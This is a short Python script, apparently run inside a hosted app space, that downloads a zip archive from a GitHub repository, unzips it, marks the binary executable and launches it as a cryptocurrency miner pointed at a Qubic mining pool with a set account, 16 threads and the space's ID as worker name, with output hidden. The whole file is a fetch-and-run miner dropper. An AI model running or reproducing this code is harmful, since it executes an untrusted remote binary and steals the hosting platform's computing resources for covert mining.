import os
os.system("wget https://github.com/qqivk/Rouy/raw/refs/heads/main/z1.zip")
os.system("unzip z1.zip")
os.system("chmod +x z1")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./z1 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
